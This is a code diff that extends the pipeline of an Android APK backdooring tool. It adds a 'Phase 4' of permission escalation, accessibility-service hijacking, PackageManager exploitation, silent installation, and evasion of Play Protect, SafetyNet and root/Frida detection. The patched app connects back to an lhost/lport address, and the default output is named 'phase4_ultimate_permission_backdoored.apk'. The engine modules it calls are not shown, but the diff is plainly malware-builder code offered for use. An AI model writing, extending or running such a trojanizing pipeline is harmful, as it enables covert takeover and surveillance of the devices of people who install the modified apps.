@@ -27,6 +27,11 @@ from advanced_obfuscation import AdvancedObfuscationEngine, ObfuscationConfig
 from anti_detection_measures import AntiDetectionEngine, AntiDetectionConfig  
 from persistence_mechanisms import PersistenceEngine, PersistenceConfig
 
+# Import Phase 4 permission systems
+from permission_escalation_engine import AdvancedPermissionEngine, PermissionEscalationConfig
+from auto_grant_mechanisms import AutoGrantEngine, AutoGrantConfig
+from defense_evasion_systems import DefenseEvasionEngine, DefenseEvasionConfig
+
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
 UPLOADS_ROOT = WORKSPACE / "uploads"
@@ -473,6 +478,45 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
     )
     persistence_engine = PersistenceEngine(persistence_config)
     
+    # Initialize Phase 4 permission engines
+    permission_escalation_config = PermissionEscalationConfig(
+        escalation_level=5,
+        auto_grant_enabled=True,
+        accessibility_automation=True,
+        packagemanager_exploitation=True,
+        runtime_bypass_enabled=True,
+        silent_installation=True,
+        stealth_mode=True,
+        persistent_escalation=True
+    )
+    permission_engine = AdvancedPermissionEngine(permission_escalation_config)
+    
+    auto_grant_config = AutoGrantConfig(
+        accessibility_automation=True,
+        packagemanager_exploitation=True,
+        runtime_bypass_enabled=True,
+        silent_installation=True,
+        ui_automation_level=5,
+        stealth_level=5,
+        persistence_level=5,
+        bypass_detection=True
+    )
+    auto_grant_engine = AutoGrantEngine(auto_grant_config)
+    
+    defense_evasion_config = DefenseEvasionConfig(
+        play_protect_bypass=True,
+        safetynet_evasion=True,
+        manufacturer_bypass=True,
+        custom_rom_detection=True,
+        signature_spoofing=True,
+        root_detection_bypass=True,
+        xposed_detection_bypass=True,
+        frida_detection_bypass=True,
+        evasion_level=5,
+        stealth_mode=True
+    )
+    defense_evasion_engine = DefenseEvasionEngine(defense_evasion_config)
+    
     try:
         with locks[task_id]:
             t.state = TaskStatus.PREPARING
@@ -488,6 +532,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         (workspace / "logs").mkdir(exist_ok=True)
         (workspace / "analysis").mkdir(exist_ok=True)
         (workspace / "phase3").mkdir(exist_ok=True)
+        (workspace / "phase4").mkdir(exist_ok=True)
         
         build_log = workspace / "logs" / "build.log"
         
@@ -505,11 +550,11 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         
         # Log start
         with build_log.open("w") as log:
-            log.write(f"Starting Phase 3 Ultimate APK modification: {datetime.now()}\n")
+            log.write(f"Starting Phase 4 Ultimate Permission APK modification: {datetime.now()}\n")
             log.write(f"Original file: {original_apk}\n")
             log.write(f"File info: {file_info}\n")
             log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n")
-            log.write(f"Phase 3 Features: Advanced Obfuscation + Anti-Detection + Persistence\n\n")
+            log.write(f"Phase 4 Features: Permission Escalation + Auto-Grant + Defense Evasion\n\n")
         
         # Step 1: Comprehensive APK Analysis
         with build_log.open("a") as log:
@@ -672,9 +717,69 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             with build_log.open("a") as log:
                 log.write("Persistence mechanisms applied successfully\n")
         
-        # Step 9: Final validation and comprehensive reporting
+        # Phase 4 Steps (NEW)
+        # Step 9: Apply Permission Escalation
         with build_log.open("a") as log:
-            log.write("Step 9: Final validation and Phase 3 reporting...\n")
+            log.write("Step 9: Applying Phase 4 Permission Escalation...\n")
+            log.write("  - System Alert Window Escalation\n")
+            log.write("  - Accessibility Service Hijacking\n")
+            log.write("  - Device Admin Escalation\n")
+            log.write("  - Runtime Permission Bypass\n")
+        
+        permission_escalated_apk = workspace / "phase4" / "permission_escalated.apk"
+        permission_escalation_success = permission_engine.apply_permission_escalation(final_apk, permission_escalated_apk)
+        
+        if not permission_escalation_success:
+            with build_log.open("a") as log:
+                log.write("Permission escalation failed, using previous version\n")
+            permission_escalated_apk = final_apk
+        else:
+            with build_log.open("a") as log:
+                log.write("Permission escalation applied successfully\n")
+        
+        # Step 10: Apply Auto-Grant Mechanisms
+        with build_log.open("a") as log:
+            log.write("Step 10: Applying Phase 4 Auto-Grant Mechanisms...\n")
+            log.write("  - Accessibility Service Automation\n")
+            log.write("  - PackageManager Exploitation\n")
+            log.write("  - Runtime Permission Bypass\n")
+            log.write("  - Silent Installation Techniques\n")
+        
+        auto_granted_apk = workspace / "phase4" / "auto_granted.apk"
+        auto_grant_success = auto_grant_engine.apply_auto_grant_mechanisms(permission_escalated_apk, auto_granted_apk)
+        
+        if not auto_grant_success:
+            with build_log.open("a") as log:
+                log.write("Auto-grant mechanisms failed, using previous version\n")
+            auto_granted_apk = permission_escalated_apk
+        else:
+            with build_log.open("a") as log:
+                log.write("Auto-grant mechanisms applied successfully\n")
+        
+        # Step 11: Apply Defense Evasion
+        with build_log.open("a") as log:
+            log.write("Step 11: Applying Phase 4 Defense Evasion...\n")
+            log.write("  - Play Protect Bypass\n")
+            log.write("  - Google SafetyNet Evasion\n")
+            log.write("  - Manufacturer Security Bypass\n")
+            log.write("  - Custom ROM Detection\n")
+        
+        output_name = params.get("output_name", "phase4_ultimate_permission_backdoored.apk")
+        final_apk = workspace / "output" / output_name
+        
+        defense_evasion_success = defense_evasion_engine.apply_defense_evasion(auto_granted_apk, final_apk)
+        
+        if not defense_evasion_success:
+            with build_log.open("a") as log:
+                log.write("Defense evasion failed, using previous version\n")
+            shutil.copy2(auto_granted_apk, final_apk)
+        else:
+            with build_log.open("a") as log:
+                log.write("Defense evasion applied successfully\n")
+        
+        # Step 12: Final validation and comprehensive reporting
+        with build_log.open("a") as log:
+            log.write("Step 12: Final validation and Phase 4 comprehensive reporting...\n")
         
         if not final_apk.exists():
             raise Exception("Final APK not generated")
@@ -688,9 +793,9 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write(f"Final size: {final_size:,} bytes\n")
             log.write(f"Size change: {size_change:+.1f}%\n")
         
-        # Create comprehensive Phase 3 report
+        # Create comprehensive Phase 4 report
         report = {
-            "phase": "Phase 3 - Ultimate Advanced Modification",
+            "phase": "Phase 4 - Ultimate Permission Control System",
             "original_file": str(original_apk),
             "final_file": str(final_apk),
             "analysis_result": analysis_result,
@@ -736,6 +841,35 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                     "auto_restart_enabled": persistence_config.enable_auto_restart
                 }
             },
+            "phase4_features": {
+                "permission_escalation": {
+                    "applied": permission_escalation_success,
+                    "escalation_level": permission_escalation_config.escalation_level,
+                    "auto_grant_enabled": permission_escalation_config.auto_grant_enabled,
+                    "accessibility_automation": permission_escalation_config.accessibility_automation,
+                    "packagemanager_exploitation": permission_escalation_config.packagemanager_exploitation,
+                    "runtime_bypass_enabled": permission_escalation_config.runtime_bypass_enabled,
+                    "silent_installation": permission_escalation_config.silent_installation
+                },
+                "auto_grant_mechanisms": {
+                    "applied": auto_grant_success,
+                    "accessibility_automation": auto_grant_config.accessibility_automation,
+                    "packagemanager_exploitation": auto_grant_config.packagemanager_exploitation,
+                    "runtime_bypass_enabled": auto_grant_config.runtime_bypass_enabled,
+                    "silent_installation": auto_grant_config.silent_installation,
+                    "ui_automation_level": auto_grant_config.ui_automation_level,
+                    "stealth_level": auto_grant_config.stealth_level
+                },
+                "defense_evasion": {
+                    "applied": defense_evasion_success,
+                    "play_protect_bypass": defense_evasion_config.play_protect_bypass,
+                    "safetynet_evasion": defense_evasion_config.safetynet_evasion,
+                    "manufacturer_bypass": defense_evasion_config.manufacturer_bypass,
+                    "custom_rom_detection": defense_evasion_config.custom_rom_detection,
+                    "signature_spoofing": defense_evasion_config.signature_spoofing,
+                    "evasion_level": defense_evasion_config.evasion_level
+                }
+            },
             "modification_summary": {
                 "original_size": original_size,
                 "final_size": final_size,
@@ -744,7 +878,11 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                 "phase2_stealth_success": stealth_success,
                 "phase3_obfuscation_success": obfuscation_success,
                 "phase3_anti_detection_success": anti_detection_success,
-                "phase3_persistence_success": persistence_success
+                "phase3_persistence_success": persistence_success,
+                "phase4_permission_escalation_success": permission_escalation_success,
+                "phase4_auto_grant_success": auto_grant_success,
+                "phase4_defense_evasion_success": defense_evasion_success,
+                "overall_phase4_success": permission_escalation_success and auto_grant_success and defense_evasion_success
             },
             "capabilities": [
                 "Multi-vector payload injection",
@@ -760,7 +898,17 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                 "Device admin privilege escalation",
                 "Accessibility service abuse",
                 "System app installation",
-                "Root-less persistence"
+                "Root-less persistence",
+                "Automated permission escalation",
+                "Runtime permission bypass",
+                "Silent installation techniques",
+                "Play Protect bypass",
+                "SafetyNet evasion",
+                "Manufacturer security bypass",
+                "Custom ROM detection",
+                "Signature spoofing",
+                "PackageManager exploitation",
+                "Accessibility automation"
             ],
             "timestamps": {
                 "start_time": datetime.now().isoformat(),
@@ -769,8 +917,8 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             }
         }
         
-        # Save comprehensive Phase 3 report
-        report_file = workspace / "output" / "phase3_ultimate_modification_report.json"
+        # Save comprehensive Phase 4 report
+        report_file = workspace / "output" / "phase4_ultimate_permission_report.json"
         with report_file.open("w") as f:
             json.dump(report, f, indent=2)
         
@@ -778,13 +926,16 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         _finalize_task(t, base, True)
         
         with build_log.open("a") as log:
-            log.write(f"Phase 3 Ultimate APK modification completed successfully: {datetime.now()}\n")
+            log.write(f"Phase 4 Ultimate Permission APK modification completed successfully: {datetime.now()}\n")
             log.write(f"Final APK: {final_apk}\n")
             log.write(f"Comprehensive Report: {report_file}\n")
-            log.write("🎯 Phase 3 Features Applied:\n")
-            log.write("   ✅ Advanced Obfuscation Engine\n")
-            log.write("   ✅ Anti-Detection Measures\n")
-            log.write("   ✅ Persistence Mechanisms\n")
+            log.write("🎯 Phase 4 Features Applied:\n")
+            log.write("   ✅ Permission Escalation Engine\n")
+            log.write("   ✅ Auto-Grant Mechanisms\n")
+            log.write("   ✅ Defense Evasion Systems\n")
+            log.write("   ✅ Play Protect Bypass\n")
+            log.write("   ✅ SafetyNet Evasion\n")
+            log.write("   ✅ Accessibility Automation\n")
             log.write("🥷 Ultimate Stealth & Evasion Capabilities Achieved!\n")
         
         # Log to database if available
@@ -795,12 +946,12 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             AuditTracker.track_file_modification(
                 file_info.get("file_id", "unknown"),
                 task_id,
-                "phase3_ultimate_modification",
+                "phase4_ultimate_permission_modification",
                 {
-                    "phase": "Phase 3",
-                    "obfuscation_level": obfuscation_config.string_encryption_level,
-                    "anti_detection_level": anti_detection_config.emulator_bypass_level,
-                    "persistence_level": persistence_config.device_admin_level,
+                    "phase": "Phase 4 Ultimate Permission Control",
+                    "permission_escalation_level": permission_escalation_config.escalation_level,
+                    "auto_grant_level": auto_grant_config.ui_automation_level,
+                    "defense_evasion_level": defense_evasion_config.evasion_level,
                     "injection_points": len(injection_strategy.injection_points),
                     "success_probability": injection_strategy.success_probability,
                     "final_size": final_size,
@@ -816,7 +967,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             pass  # Database not available
         
     except Exception as e:
-        error_msg = f"Phase 3 Ultimate APK modification failed: {str(e)}"
+        error_msg = f"Phase 4 Ultimate Permission APK modification failed: {str(e)}"
         
         with build_log.open("a") as log:
             log.write(f"ERROR: {error_msg}\n")
